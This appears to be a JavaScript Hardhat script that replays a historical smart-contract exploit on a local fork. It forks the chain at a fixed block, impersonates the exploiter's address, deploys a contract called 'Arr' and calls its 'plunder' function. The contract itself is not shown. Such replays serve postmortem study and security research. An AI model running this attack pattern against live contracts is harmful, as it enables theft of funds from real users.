const [addresses, forkFrom, impersonate] = require('../utils/utils.js');

async function main() {
    forkFrom(11242695);


    
    impersonate(addresses.exploiter);
    const attacker = ethers.provider.getSigner(addresses.exploiter);
   

    // We get the contract to deploy
    const Arr = await ethers.getContractFactory("Arr");
    //const val = ethers.utils.parseEther(1).toString();
    const arr = await Arr.deploy();
    console.log("Exploit deployed to:", arr.address);
  
    attacker.sendTransaction({
        to: arr.address,
        value: 10
    });
    
    await arr.plunder({gasLimit: 22000000, gasPrice: 99});

  }
  
  main()
    .then(() => process.exit(0))
    .catch(error => {
      console.error(error);
      process.exit(1);
    });